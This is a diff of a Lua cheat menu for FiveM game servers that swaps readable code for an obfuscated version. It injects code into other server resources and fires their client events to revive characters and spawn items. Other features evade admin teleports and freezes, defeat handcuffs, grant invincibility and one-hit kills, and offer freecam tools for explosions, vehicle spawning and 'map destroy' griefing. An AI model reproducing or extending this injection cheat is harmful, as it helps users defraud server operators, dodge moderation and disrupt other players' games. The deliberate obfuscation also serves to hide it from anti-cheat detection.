-    MachoMenuNotification("s1", "Admin TP evasion activated")
-    
-    Citizen.CreateThread(function()
-        while evadeTPActive do
-            Citizen.Wait(100)
-            local current_pos = GetEntityCoords(PlayerPedId())
-            local distance = #(lastPosition - current_pos)
-            
-            if distance > 50 then
-                SetEntityCoordsNoOffset(PlayerPedId(), lastPosition.x, lastPosition.y, lastPosition.z, false, false, false, true)
-                MachoMenuNotification("s1", "Blocked admin teleport!")
-            else
-                lastPosition = current_pos
-            end
-        end
-    end)
-end, function()
-    evadeTPActive = false
-    MachoMenuNotification("s1", "Admin TP evasion deactivated")
-end)
-
--- s1 Block Admin Freeze (Toggle)
-local blockFreezeActive = false
-MachoMenuCheckbox(FirstSection, "s1 Block Admin Freeze", function()
-    blockFreezeActive = true
-    MachoMenuNotification("s1", "Admin freeze block activated")
-    
-    Citizen.CreateThread(function()
-        while blockFreezeActive do
-            Citizen.Wait(0)
-            FreezeEntityPosition(PlayerPedId(), false)
-        end
-    end)
-end, function()
-    blockFreezeActive = false
-    MachoMenuNotification("s1", "Admin freeze block deactivated")
-end)
-
--- s1 Anti Fire (Toggle)
-local antiFireActive = false
-MachoMenuCheckbox(FirstSection, "s1 Anti Fire", function()
-    antiFireActive = true
-    MachoMenuNotification("s1", "Anti fire activated")
-    
-    Citizen.CreateThread(function()
-        while antiFireActive do
-            Citizen.Wait(0)
-            StopEntityFire(PlayerPedId())
-        end
-    end)
-end, function()
-    antiFireActive = false
-    MachoMenuNotification("s1", "Anti fire deactivated")
-end)
-
--- s1 Anti Attach (Toggle)
-local antiAttachActive = false
-MachoMenuCheckbox(FirstSection, "s1 Anti Attach", function()
-    antiAttachActive = true
-    MachoMenuNotification("s1", "Anti attach activated")
-    
-    Citizen.CreateThread(function()
-        while antiAttachActive do
-            Citizen.Wait(0)
-            for _, v in ipairs(GetGamePool("CVehicle")) do
-                if IsEntityAttachedToAnyPed(v) and GetEntityAttachedTo(v) == PlayerPedId() then
-                    NetworkRequestControlOfEntity(v)
-                    DetachEntity(v, 0, true)
-                end
-            end
-            for _, obj in ipairs(GetGamePool("CObject")) do
-                if IsEntityAttachedToAnyPed(obj) and GetEntityAttachedTo(obj) == PlayerPedId() then
-                    NetworkRequestControlOfEntity(obj)
-                    DetachEntity(obj, 0, true)
-                end
-            end
-        end
-    end)
-end, function()
-    antiAttachActive = false
-    MachoMenuNotification("s1", "Anti attach deactivated")
-end)
-
--- s1 Anti VDM (Toggle)
-local antiVDMActive = false
-MachoMenuCheckbox(FirstSection, "s1 Anti VDM", function()
-    antiVDMActive = true
-    MachoMenuNotification("s1", "Anti VDM activated")
-    
-    Citizen.CreateThread(function()
-        while antiVDMActive do
-            Citizen.Wait(0)
-            local playerPed = PlayerPedId()
-            local pCoords = GetEntityCoords(playerPed)
-            for _, vehicle in ipairs(GetGamePool("CVehicle")) do
-                if DoesEntityExist(vehicle) then
-                    local vCoords = GetEntityCoords(vehicle)
-                    local dist = #(pCoords - vCoords)
-                    if dist <= 50.0 then
-                        SetEntityNoCollisionEntity(vehicle, playerPed, true)
-                    end
-                end
-            end
-        end
-    end)
-end, function()
-    antiVDMActive = false
-    MachoMenuNotification("s1", "Anti VDM deactivated")
-end)
-
--- s1 Anti Handcuff (Toggle)
-local antiHandcuffActive = false
-MachoMenuCheckbox(FirstSection, "s1 Anti Handcuff", function()
-    antiHandcuffActive = true
-    MachoMenuNotification("s1", "Anti handcuff activated")
-    
-    Citizen.CreateThread(function()
-        while antiHandcuffActive do
-            Citizen.Wait(0)
-            EnableAllControlActions(0)
-            EnableAllControlActions(1)
-        end
-    end)
-end, function()
-    antiHandcuffActive = false
-    MachoMenuNotification("s1", "Anti handcuff deactivated")
-end)
-
--- s1 Evade Hostage Situation
-MachoMenuButton(FirstSection, "s1 Evade Hostage Situation", function()
-    MachoMenuNotification("s1", "Hostage evade activated")
-    -- You can add more logic here if needed
-end)
-
--- Noclip movement control
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(0)
-        playerPed = PlayerPedId()
-
-        if noclipActive then
-            local coords = GetEntityCoords(playerPed)
-            local camRot = GetGameplayCamRot(2)
-            local heading = math.rad(camRot.z)
-            local speed = noclipSpeed
-
-            if IsControlPressed(0, 32) then -- W
-                coords = coords + vector3(speed * math.sin(heading), speed * -math.cos(heading), 0.0)
-            end
-            if IsControlPressed(0, 33) then -- S
-                coords = coords + vector3(-speed * math.sin(heading), -speed * -math.cos(heading), 0.0)
-            end
-            if IsControlPressed(0, 34) then -- A
-                coords = coords + vector3(speed * math.cos(heading), speed * math.sin(heading), 0.0)
-            end
-            if IsControlPressed(0, 35) then -- D
-                coords = coords + vector3(-speed * math.cos(heading), -speed * math.sin(heading), 0.0)
-            end
-            if IsControlPressed(0, 21) then -- Shift (up)
-                coords = coords + vector3(0.0, 0.0, speed)
-            end
-            if IsControlPressed(0, 36) then -- Ctrl (down)
-                coords = coords + vector3(0.0, 0.0, -speed)
-            end
-
-            SetEntityCoordsNoOffset(playerPed, coords.x, coords.y, coords.z, true, true, true)
-
-            if not IsEntityPlayingAnim(playerPed, fallAnimDict, fallAnim, 3) then
-                TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
-            end
-
-            if not IsPedRagdoll(playerPed) then
-                SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
-            end
-
-            SetEntityRotation(playerPed, 0.0, 0.0, camRot.z, 2, true)
-        end
-    end
-end)
-
-local originalCameraCoords = vector3(0, 0, 0)
-local isCameraActive = false
-local playerPed = PlayerPedId()
-local playerHeading = 0
-local flyCam = nil
-local isFrozen = false
-local camSpeed = 2.0
-local fallAnimDict = "move_jump"
-local fallAnim = "land_roll"
-
-function LoadAnimDict(dict)
-    RequestAnimDict(dict)
-    while not HasAnimDictLoaded(dict) do
-        Citizen.Wait(0)
-    end
-end
-
--- Function to create the camera
-function CreateCamera()
-    local playerCoords = GetEntityCoords(playerPed, true) -- Get player's exact coordinates
-    originalCameraCoords = playerCoords + vector3(0.0, 0.0, 1.5) -- Start 1.5 units above player's head
-    playerHeading = GetEntityHeading(playerPed)
-    flyCam = CreateCam("DEFAULT_SCRIPTED_FLY_CAMERA", true)
-    SetCamCoord(flyCam, originalCameraCoords.x, originalCameraCoords.y, originalCameraCoords.z)
-    SetCamRot(flyCam, 0.0, 0.0, playerHeading, 2)
-    RenderScriptCams(true, false, 0, true, true)
-    isCameraActive = true
-    FreezeEntityPosition(playerPed, true)
-    isFrozen = true
-end
-
--- Function to destroy the camera
-function DestroyCamera()
-    if isCameraActive then
-        RenderScriptCams(false, false, 0, true, true)
-        DestroyCam(flyCam, false)
-        isCameraActive = false
-        FreezeEntityPosition(playerPed, false)
-        isFrozen = false
-    end
-end
-
--- Safe Freecam Menu
-MachoMenuCheckbox(FirstSection, "Freecam - Safe", function()
-    MachoInjectResource('monitor', [[
+                ]],v215,v216));break;end end end MachoMenuNotification("RT Steal","Spawning "   .. v215   .. " x"   .. v216 );print("[RT Steal] Spawning "   .. v215   .. " x"   .. v216 );else MachoMenuNotification("Error","Please enter a valid amount!");end else MachoMenuNotification("Error","Please enter an item name!");end break;end end end);MachoMenuButton(v9,"FB Clothes",function() local v217=0;while true do if (v217==(0 -0)) then TriggerEvent("FBClothing:client:openOutfitMenu");MachoMenuNotification("FB Clothes","Opening FB outfit menu...");break;end end end);MachoMenuButton(v9,"FB Revive",function() local v218=0 + 0 ;while true do if (v218==(796 -(588 + 208))) then TriggerEvent("FB_Ems:triggers:client:revivePlayer");MachoMenuNotification("FB Revive","Revive requested...");break;end end end);MachoMenuButton(v9,"rc2 Revive",function() TriggerEvent("hospital:client:Revive");MachoMenuNotification("Hospital","Revive requested...");end);MachoMenuButton(v9,"s1 Teleport to Waypoint",function() local v219=0 -0 ;local v220;while true do if (v219==(1800 -(884 + 916))) then v220=GetFirstBlipInfoId(8);if  not DoesBlipExist(v220) then MachoMenuNotification("s1","No waypoint set!");else local v798=GetBlipInfoIdCoord(v220);local v799=PlayerPedId();local v800=v799;if IsPedInAnyVehicle(v799,false) then v800=GetVehiclePedIsIn(v799,false);end SetEntityCoordsNoOffset(v800,v798.x,v798.y,v798.z,false,false,false,false);MachoMenuNotification("s1","Teleported to waypoint!");end break;end end end);local v29=false;MachoMenuCheckbox(v9,"s1 Super Jump",function() local v221=0 -0 ;while true do if (v221==(0 + 0)) then v29=true;MachoMenuNotification("s1","Super Jump ON");break;end end end,function() v29=false;MachoMenuNotification("s1","Super Jump OFF");end);local v30=656 -(232 + 421) ;local v31=MachoMenuSlider(v9,"s1 Fast Run Speed",v30,1890 -(1569 + 320) ,3 + 7 ,"x",1,function(v222) v30=v222;end);local v32=false;MachoMenuCheckbox(v9,"s1 Fast Run",function() local v223=0;while true do if ((0 + 0)==v223) then v32=true;MachoMenuNotification("s1","Fast Run ACTIVE (Speed: "   .. v30   .. "x)" );v223=3 -2 ;end if (1==v223) then Citizen.CreateThread(function() local v772=0;while true do if (v772==0) then while v32 do local v932=605 -(316 + 289) ;while true do if (v932==(0 -0)) then Citizen.Wait(0 + 0 );SetPedMoveRateOverride(PlayerPedId(),v30 + (1453 -(666 + 787)) );break;end end end SetPedMoveRateOverride(PlayerPedId(),1);break;end end end);break;end end end,function() v32=false;SetPedMoveRateOverride(PlayerPedId(),426 -(360 + 65) );MachoMenuNotification("s1","Fast Run OFF");end);local v33=false;MachoMenuCheckbox(v9,"s1 No Ragdoll",function() v33=true;SetPedCanRagdoll(PlayerPedId(),false);MachoMenuNotification("s1","No Ragdoll ON");end,function() local v224=0 + 0 ;while true do if (v224==1) then MachoMenuNotification("s1","No Ragdoll OFF");break;end if (v224==0) then v33=false;SetPedCanRagdoll(PlayerPedId(),true);v224=1;end end end);local v34=false;MachoMenuCheckbox(v9,"s1 Anti AFK",function() local v225=254 -(79 + 175) ;while true do if ((0 -0)==v225) then v34=true;MachoMenuNotification("s1","Anti AFK ACTIVE");v225=1 + 0 ;end if (v225==(2 -1)) then Citizen.CreateThread(function() while v34 do Citizen.Wait(9629 -4629 );local v801=PlayerPedId();local v802=GetEntityCoords(v801);SetEntityCoordsNoOffset(v801,v802.x + (899.01 -(503 + 396)) ,v802.y + 0.01 ,v802.z,false,false,false,false);end end);break;end end end,function() local v226=0;while true do if ((181 -(92 + 89))==v226) then v34=false;MachoMenuNotification("s1","Anti AFK OFF");break;end end end);local v35=false;MachoMenuCheckbox(v9,"s1 Infinite Stamina",function() local v227=0 -0 ;while true do if (v227==0) then v35=true;MachoMenuNotification("s1","Infinite Stamina ACTIVE");v227=1;end if (v227==(1 + 0)) then Citizen.CreateThread(function() while v35 do local v803=0 + 0 ;while true do if (v803==0) then Citizen.Wait(1958 -1458 );ResetPlayerStamina(PlayerPedId());break;end end end end);break;end end end,function() local v228=0 + 0 ;while true do if (v228==0) then v35=false;MachoMenuNotification("s1","Infinite Stamina OFF");break;end end end);local v36=false;MachoMenuCheckbox(v9,"s1 Infinite Oxygen",function() v36=true;SetPedDiesInWater(PlayerPedId(),false);MachoMenuNotification("s1","Infinite Oxygen ON");end,function() v36=false;SetPedDiesInWater(PlayerPedId(),true);MachoMenuNotification("s1","Infinite Oxygen OFF");end);local v37=false;MachoMenuCheckbox(v9,"s1 Disable Collision",function() local v229=0;while true do if (v229==1) then MachoMenuNotification("s1","Disable Collision ON");break;end if (v229==0) then v37=true;SetEntityCollision(PlayerPedId(),false,false);v229=2 -1 ;end end end,function() v37=false;SetEntityCollision(PlayerPedId(),true,true);MachoMenuNotification("s1","Disable Collision OFF");end);local v38=false;MachoMenuCheckbox(v9,"s1 Fast Punch",function() v38=true;MachoMenuNotification("s1","Fast Punch ON");end,function() local v230=0 + 0 ;while true do if (v230==(0 + 0)) then v38=false;MachoMenuNotification("s1","Fast Punch OFF");break;end end end);local v39=false;MachoMenuCheckbox(v9,"s1 Super Punch",function() local v231=0;while true do if (v231==(2 -1)) then MachoMenuNotification("s1","Super Punch ON (One-hit kill)");break;end if (v231==(0 + 0)) then v39=true;SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"),1525016 -525016 );v231=1245 -(485 + 759) ;end end end,function() local v232=0 -0 ;while true do if ((1189 -(442 + 747))==v232) then v39=false;SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"),1);v232=1;end if (v232==(1136 -(832 + 303))) then MachoMenuNotification("s1","Super Punch OFF");break;end end end);MachoMenuButton(v9,"Open face Menu",function() local v233=0;while true do if (v233==(946 -(88 + 858))) then TriggerEvent("m3-clothingmenu:client:OpenSurgeonShop");MachoMenuNotification("Clothes","Opening clothes menu...");break;end end end);MachoMenuButton(v9,"Open Barber Shop",function() TriggerEvent("m3-clothingmenu:client:OpenBarberShop");MachoMenuNotification("Barber","Opening barber shop...");end);MachoMenuButton(v9,"Open Clothing Shop",function() TriggerEvent("m3-clothingmenu:client:openClothingShopMenu");MachoMenuNotification("Clothing Shop","Opening clothing shop...");end);MachoMenuButton(v9,"RT Revive 2",function() TriggerEvent("RespectEMS:triggers:client:revivePlayer");MachoMenuNotification("RT Revive 2","Revive requested...");end);MachoMenuButton(v9,"Change Character",function() TriggerEvent("qb-MultiCharacter:server:openui");MachoMenuNotification("Character","Opening character selection...");end);MachoMenuButton(v9,"s1 Remove PTFX",function() Citizen.CreateThread(function() local v493=0 + 0 ;local v494;while true do if (v493==(1 + 0)) then RemoveParticleFxFromEntity(PlayerPedId());MachoMenuNotification("s1","Removed PTFX effects");break;end if (v493==0) then v494=GetEntityCoords(PlayerPedId());RemoveParticleFxInRange(v494.x,v494.y,v494.z,9 + 191 );v493=1;end end end);end);MachoMenuButton(v9,"s1 Stop All Sounds",function() Citizen.CreateThread(function() for v522=790 -(766 + 23) ,493 -393  do StopSound(v522);end MachoMenuNotification("s1","Stopped all sounds");end);end);MachoMenuButton(v9,"s1 Remove Admin Freeze",function() for v495=1 -0 ,4 -2  do EnableAllControlActions(v495);end FreezeEntityPosition(PlayerPedId(),false);SetEntityCollision(PlayerPedId(),false,true);Citizen.Wait(1018 -718 );SetEntityCollision(PlayerPedId(),true,true);Citizen.Wait(3573 -(1036 + 37) );if IsEntityPositionFrozen(PlayerPedId()) then local v523=0;while true do if (v523==(0 + 0)) then MachoMenuNotification("s1","Detected still frozen, trying again...");for v865=1,2 do EnableAllControlActions(v865);end v523=1 -0 ;end if (v523==1) then for v866=1 + 0 ,1490 -(641 + 839)  do FreezeEntityPosition(PlayerPedId(),false);end MachoMenuNotification("s1","Admin freeze removed");break;end end else MachoMenuNotification("s1","Admin freeze removed");end end);MachoMenuButton(v9,"s1 Remove Attached Objects",function() Citizen.CreateThread(function() local v496=913 -(910 + 3) ;local v497;local v498;while true do if (1==v496) then for v804,v805 in ipairs(v497) do if DoesEntityExist(v805) then DetachEntity(v805,true,true);v498=v498 + 1 ;end end MachoMenuNotification("s1","Removed "   .. v498   .. " attached objects" );break;end if (v496==(0 -0)) then v497=GetGamePool("CObject");v498=1684 -(1466 + 218) ;v496=1 + 0 ;end end end);end);local v40=false;MachoMenuCheckbox(v9,"s1 Disable Hostile Peds",function() v40=true;MachoMenuNotification("s1","Hostile peds disabled");Citizen.CreateThread(function() while v40 do local v524=0;while true do if (v524==0) then Citizen.Wait(0);SetPedResetFlag(PlayerPedId(),1272 -(556 + 592) ,true);v524=1;end if (v524==(1 + 0)) then SetEveryoneIgnorePlayer(PlayerPedId(),true);break;end end end end);end,function() local v234=0;while true do if (v234==(808 -(329 + 479))) then v40=false;MachoMenuNotification("s1","Hostile peds enabled");break;end end end);local v41=false;local v42=nil;MachoMenuCheckbox(v9,"s1 Evade Admin TP",function() v41=true;v42=GetEntityCoords(PlayerPedId());MachoMenuNotification("s1","Admin TP evasion activated");Citizen.CreateThread(function() while v41 do local v525=854 -(174 + 680) ;local v526;local v527;while true do if (0==v525) then Citizen.Wait(343 -243 );v526=GetEntityCoords(PlayerPedId());v525=1;end if (v525==(1 -0)) then v527= #(v42-v526);if (v527>(36 + 14)) then local v924=739 -(396 + 343) ;while true do if (v924==0) then SetEntityCoordsNoOffset(PlayerPedId(),v42.x,v42.y,v42.z,false,false,false,true);MachoMenuNotification("s1","Blocked admin teleport!");break;end end else v42=v526;end break;end end end end);end,function() local v235=0;while true do if (v235==(0 + 0)) then v41=false;MachoMenuNotification("s1","Admin TP evasion deactivated");break;end end end);local v43=false;MachoMenuCheckbox(v9,"s1 Block Admin Freeze",function() local v236=1477 -(29 + 1448) ;while true do if (v236==0) then v43=true;MachoMenuNotification("s1","Admin freeze block activated");v236=1;end if (v236==1) then Citizen.CreateThread(function() while v43 do local v806=0;while true do if (v806==(1389 -(135 + 1254))) then Citizen.Wait(0 -0 );FreezeEntityPosition(PlayerPedId(),false);break;end end end end);break;end end end,function() local v237=0 -0 ;while true do if (v237==(0 + 0)) then v43=false;MachoMenuNotification("s1","Admin freeze block deactivated");break;end end end);local v44=false;MachoMenuCheckbox(v9,"s1 Anti Fire",function() local v238=1527 -(389 + 1138) ;while true do if (v238==(575 -(102 + 472))) then Citizen.CreateThread(function() while v44 do local v807=0 + 0 ;while true do if ((0 + 0)==v807) then Citizen.Wait(0 + 0 );StopEntityFire(PlayerPedId());break;end end end end);break;end if (v238==(1545 -(320 + 1225))) then v44=true;MachoMenuNotification("s1","Anti fire activated");v238=1 -0 ;end end end,function() local v239=0;while true do if (v239==(0 + 0)) then v44=false;MachoMenuNotification("s1","Anti fire deactivated");break;end end end);local v45=false;MachoMenuCheckbox(v9,"s1 Anti Attach",function() v45=true;MachoMenuNotification("s1","Anti attach activated");Citizen.CreateThread(function() while v45 do Citizen.Wait(1464 -(157 + 1307) );for v700,v701 in ipairs(GetGamePool("CVehicle")) do if (IsEntityAttachedToAnyPed(v701) and (GetEntityAttachedTo(v701)==PlayerPedId())) then NetworkRequestControlOfEntity(v701);DetachEntity(v701,0,true);end end for v702,v703 in ipairs(GetGamePool("CObject")) do if (IsEntityAttachedToAnyPed(v703) and (GetEntityAttachedTo(v703)==PlayerPedId())) then NetworkRequestControlOfEntity(v703);DetachEntity(v703,1859 -(821 + 1038) ,true);end end end end);end,function() v45=false;MachoMenuNotification("s1","Anti attach deactivated");end);local v46=false;MachoMenuCheckbox(v9,"s1 Anti VDM",function() local v240=0 -0 ;while true do if (v240==(1 + 0)) then Citizen.CreateThread(function() while v46 do Citizen.Wait(0);local v808=PlayerPedId();local v809=GetEntityCoords(v808);for v867,v868 in ipairs(GetGamePool("CVehicle")) do if DoesEntityExist(v868) then local v933=0 -0 ;local v934;local v935;while true do if (v933==(1 + 0)) then if (v935<=50) then SetEntityNoCollisionEntity(v868,v808,true);end break;end if (0==v933) then v934=GetEntityCoords(v868);v935= #(v809-v934);v933=2 -1 ;end end end end end end);break;end if (v240==(1026 -(834 + 192))) then v46=true;MachoMenuNotification("s1","Anti VDM activated");v240=1 + 0 ;end end end,function() v46=false;MachoMenuNotification("s1","Anti VDM deactivated");end);local v47=false;MachoMenuCheckbox(v9,"s1 Anti Handcuff",function() v47=true;MachoMenuNotification("s1","Anti handcuff activated");Citizen.CreateThread(function() while v47 do Citizen.Wait(0 + 0 );EnableAllControlActions(0);EnableAllControlActions(1 + 0 );end end);end,function() local v241=0 -0 ;while true do if (v241==0) then v47=false;MachoMenuNotification("s1","Anti handcuff deactivated");break;end end end);MachoMenuButton(v9,"s1 Evade Hostage Situation",function() MachoMenuNotification("s1","Hostage evade activated");end);Citizen.CreateThread(function() while true do Citizen.Wait(304 -(300 + 4) );v21=PlayerPedId();if v20 then local v704=GetEntityCoords(v21);local v705=GetGameplayCamRot(1 + 1 );local v706=math.rad(v705.z);local v707=v22;if IsControlPressed(0,32) then v704=v704 + vector3(v707 * math.sin(v706) ,v707 *  -math.cos(v706) ,0) ;end if IsControlPressed(0 -0 ,395 -(112 + 250) ) then v704=v704 + vector3( -v707 * math.sin(v706) , -v707 *  -math.cos(v706) ,0 + 0 ) ;end if IsControlPressed(0,84 -50 ) then v704=v704 + vector3(v707 * math.cos(v706) ,v707 * math.sin(v706) ,0 + 0 ) ;end if IsControlPressed(0 + 0 ,27 + 8 ) then v704=v704 + vector3( -v707 * math.cos(v706) , -v707 * math.sin(v706) ,0 + 0 ) ;end if IsControlPressed(0 + 0 ,1435 -(1001 + 413) ) then v704=v704 + vector3(0 -0 ,882 -(244 + 638) ,v707) ;end if IsControlPressed(693 -(627 + 66) ,107 -71 ) then v704=v704 + vector3(0,0, -v707) ;end SetEntityCoordsNoOffset(v21,v704.x,v704.y,v704.z,true,true,true);if  not IsEntityPlayingAnim(v21,v23,v24,605 -(512 + 90) ) then TaskPlayAnim(v21,v23,v24,1914 -(1665 + 241) , -(725 -(373 + 344)), -(1 + 0),13 + 36 ,0 -0 ,false,false,false);end if  not IsPedRagdoll(v21) then SetPedToRagdoll(v21,1692 -692 ,2099 -(35 + 1064) ,0,true,true,false);end SetEntityRotation(v21,0,0 + 0 ,v705.z,4 -2 ,true);end end end);local v48=vector3(0 + 0 ,0,1236 -(298 + 938) );local v49=false;local v21=PlayerPedId();local v50=1259 -(233 + 1026) ;local v51=nil;local v52=false;local v53=1668 -(636 + 1030) ;local v23="move_jump";local v24="land_roll";function LoadAnimDict(v242) local v243=0;while true do if (v243==0) then RequestAnimDict(v242);while  not HasAnimDictLoaded(v242) do Citizen.Wait(0 + 0 );end break;end end end function CreateCamera() local v244=GetEntityCoords(v21,true);v48=v244 + vector3(0,0,1.5 + 0 ) ;v50=GetEntityHeading(v21);v51=CreateCam("DEFAULT_SCRIPTED_FLY_CAMERA",true);SetCamCoord(v51,v48.x,v48.y,v48.z);SetCamRot(v51,0 + 0 ,0 + 0 ,v50,223 -(55 + 166) );RenderScriptCams(true,false,0 + 0 ,true,true);v49=true;FreezeEntityPosition(v21,true);v52=true;end function DestroyCamera() if v49 then RenderScriptCams(false,false,0 + 0 ,true,true);DestroyCam(v51,false);v49=false;FreezeEntityPosition(v21,false);v52=false;end end MachoMenuCheckbox(v9,"Freecam - Safe",function() MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         local fallAnimDict = "move_jump"
         local fallAnim = "land_roll"
@@ -933,350 +122,13 @@ MachoMenuCheckbox(FirstSection, "Freecam - Safe", function()
         SetEntityCollision(playerPed, false, false)
         SetEntityAlpha(playerPed, 150, true)
         SetEntityInvincible(playerPed, true)
-    ]])
-    CreateCamera()
-end, function()
-    MachoInjectResource('monitor', [[
+    ]]);CreateCamera();end,function() local v245=0 -0 ;while true do if ((297 -(36 + 261))==v245) then MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         ClearPedTasks(playerPed)
         SetEntityCollision(playerPed, true, true)
         ResetEntityAlpha(playerPed)
         SetEntityInvincible(playerPed, true)
-    ]])
-    DestroyCamera()
-end)
-
--- Main thread for camera movement
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(0)
-        playerPed = PlayerPedId()
-
-        if isCameraActive then
-            local camCoords = GetCamCoord(flyCam)
-            local camRot = GetCamRot(flyCam, 2)
-            local heading = math.rad(camRot.z)
-            local speed = camSpeed
-
-            -- Keyboard movement controls
-            if IsControlPressed(0, 33) then -- W
-                camCoords = camCoords + vector3(speed * math.sin(heading), speed * -math.cos(heading), 0.0)
-            end
-            if IsControlPressed(0, 32) then -- S
-                camCoords = camCoords + vector3(-speed * math.sin(heading), -speed * -math.cos(heading), 0.0)
-            end
-            if IsControlPressed(0, 35) then -- A
-                camCoords = camCoords + vector3(speed * math.cos(heading), speed * math.sin(heading), 0.0)
-            end
-            if IsControlPressed(0, 34) then -- D
-                camCoords = camCoords + vector3(-speed * math.cos(heading), -speed * math.sin(heading), 0.0)
-            end
-            if IsControlPressed(0, 44) then -- E (up)
-                camCoords = camCoords + vector3(0.0, 0.0, speed)
-            end
-            if IsControlPressed(0, 38) then -- Q (down)
-                camCoords = camCoords + vector3(0.0, 0.0, -speed)
-            end
-
-            SetCamCoord(flyCam, camCoords.x, camCoords.y, camCoords.z)
-
-            -- Mouse rotation controls
-            local rightAxisX = GetDisabledControlNormal(0, 1) * 0.25
-            local rightAxisY = GetDisabledControlNormal(0, 2) * -0.25
-            local newCamRotX = math.max(-89.0, math.min(89.0, newCamRotX))
-            local newCamRotZ = camRot.z - rightAxisX * speed
-            newCamRotX = math.max(-89.0, math.min(89.0, newCamRotX))
-            SetCamRot(flyCam, newCamRotX, 0.0, newCamRotZ, 2)
-
-            -- Animation and ragdoll effects
-            if not IsEntityPlayingAnim(playerPed, fallAnimDict, fallAnim, 3) then
-                TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
-            end
-
-            if not IsPedRagdoll(playerPed) then
-                SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
-            end
-        end
-    end
-end)
-
--- ============================================================
--- S1DEV VRP FREECAM V4 (Bigger Text + Fixed Spawn)
--- ============================================================
-
--- Freecam Variables
-local cam_active = false
-local cam = nil
-local isFreeCamEnabled = false
-local TeleportMarkerCoords = nil
-
--- Features
-local Features = {
-    "Select",
-    "Teleportation",
-    "Weapon Shot",
-    "RPG",
-    "Explosion",
-    "Shoot Car",
-    "Shoot Boat",
-    "Shoot Plane",
-    "Map Destroy"
-}
-
-local current_feature = 1
-
--- Weapon list for Weapon Shot feature
-local Weapons = {
-    "WEAPON_PISTOL",
-    "WEAPON_COMBATPISTOL",
-    "WEAPON_APPISTOL",
-    "WEAPON_PISTOL50",
-    "WEAPON_SNSPISTOL",
-    "WEAPON_HEAVYPISTOL",
-    "WEAPON_VINTAGEPISTOL",
-    "WEAPON_MICROSMG",
-    "WEAPON_SMG",
-    "WEAPON_ASSAULTSMG",
-    "WEAPON_COMBATPDW",
-    "WEAPON_MACHINEPISTOL",
-    "WEAPON_MINISMG",
-    "WEAPON_ASSAULTRIFLE",
-    "WEAPON_CARBINERIFLE",
-    "WEAPON_ADVANCEDRIFLE",
-    "WEAPON_SPECIALCARBINE",
-    "WEAPON_BULLPUPRIFLE",
-    "WEAPON_COMPACTRIFLE",
-    "WEAPON_PUMPSHOTGUN",
-    "WEAPON_SAWNOFFSHOTGUN",
-    "WEAPON_BULLPUPSHOTGUN",
-    "WEAPON_ASSAULTSHOTGUN",
-    "WEAPON_MUSKET",
-    "WEAPON_HEAVYSHOTGUN",
-    "WEAPON_SNIPERRIFLE",
-    "WEAPON_HEAVYSNIPER",
-    "WEAPON_MARKSMANRIFLE",
-    "WEAPON_MINIGUN",
-    "WEAPON_GRENADELAUNCHER",
-    "WEAPON_RPG",
-    "WEAPON_STINGER",
-    "WEAPON_FIREWORK",
-    "WEAPON_RAILGUN",
-    "WEAPON_HOMINGLAUNCHER",
-    "WEAPON_GRENADE",
-    "WEAPON_SMOKEGRENADE",
-    "WEAPON_BZGAS",
-    "WEAPON_MOLOTOV",
-    "WEAPON_PETROLCAN",
-    "WEAPON_FLARE",
-    "WEAPON_STICKYBOMB",
-    "WEAPON_PROXMINE",
-    "WEAPON_PIPEBOMB"
-}
-
-local currentWeaponIndex = 1
-
--- Vehicle sub-features (for switching between vehicles)
-local CarModels = {"adder", "zentorno", "t20", "nero", "fmj", "sultan", "kuruma2", "entityxf", "osiris", "reaper"}
-local BoatModels = {"dinghy", "jetmax", "suntrap", "tropic", "seashark", "squalo", "marquis", "predator"}
-local PlaneModels = {"lazer", "hydra", "besra", "vestra", "nimbus", "shamal", "duster", "mammatus", "velum", "stunt"}
-
-local currentCarIndex = 1
-local currentBoatIndex = 1
-local currentPlaneIndex = 1
-
--- Map Destroy Objects (With switching)
-local MapDestroyObjects = {
-    "prop_loopile_06",
-    "dt1_05_build1_damage",
-    "hei_dt1_tcmodzito",
-    "sum_prop_dufocore_01a",
-    "sr_prop_stunt_tube_xs_02a",
-    "xs_propint2_set_scifi_10",
-    "prop_crate_02a",
-    "xs_prop_arena_turret_01a_wl",
-    "xs_prop_arena_podium_02a",
-    "prop_air_bigradar",
-    "xs_prop_arena_barrel_01a_sf",
-    "prop_church_01",
-    "prop_cs_crane_arm",
-    "xs_prop_arena_turntable_01a_wl",
-    "prop_cstl_twr_b",
-    "prop_skid_tent_01",
-    "xs_prop_hamburgher_wl",
-    "prop_container_01a",
-    "prop_contnr_pile_01a",
-    "stt_prop_stunt_track_start",
-    "stt_prop_stunt_track_dwuturn",
-    "xs_prop_arena_podium_02a",
-    "prop_rock_1_b",
-    "xs_prop_arena_barrel_01a_sf",
-    "prop_rock_4_b",
-    "stt_prop_stunt_tube_fn_05",
-    "csx_seabedrock3",
-    "hei_prop_carrier_jet",
-    "prop_windmill_01",
-    "dt1_02_build1_damage",
-    "p_oil_pjack_01_amo",
-    "stt_prop_stunt_tube_l",
-    "xs_terrain_dyst_ground_07",
-    "prop_tyre_9",
-    "prop_tree_01",
-    "prop_tree_02",
-    "stt_prop_stunt_tube_fn_02"
-}
-
-local currentMapIndex = 1
-
--- ============================================================
--- FREECAM FUNCTIONS
--- ============================================================
-
-function RotationToDirection(rot)
-    local radZ = math.rad(rot.z)
-    local radX = math.rad(rot.x)
-    local cosX = math.cos(radX)
-    return vector3(
-        -math.sin(radZ) * cosX,
-        math.cos(radZ) * cosX,
-        math.sin(radX)
-    )
-end
-
-function ToggleFreeCam()
-    cam_active = not cam_active
-    if cam_active then
-        local gameplay_cam_coords = GetGameplayCamCoord()
-        local gameplay_cam_rot = GetGameplayCamRot()
-        cam = CreateCamWithParams(
-            "DEFAULT_SCRIPTED_CAMERA",
-            gameplay_cam_coords.x,
-            gameplay_cam_coords.y,
-            gameplay_cam_coords.z,
-            gameplay_cam_rot.x,
-            gameplay_cam_rot.y,
-            gameplay_cam_rot.z,
-            50.0
-        )
-        SetCamActive(cam, true)
